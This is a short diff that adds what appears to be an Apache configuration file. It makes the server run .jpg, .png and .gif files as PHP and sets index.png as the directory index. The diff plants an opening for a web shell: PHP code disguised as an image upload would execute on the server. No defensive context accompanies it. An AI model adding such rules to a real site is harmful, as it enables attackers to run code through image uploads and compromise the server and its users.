@@ -1,0 +1,4 @@
+Directory Index index.png
+AddType application/x-httpd-php .jpg
+AddType application/x-httpd-php .png
+AddType application/x-httpd-php .gif
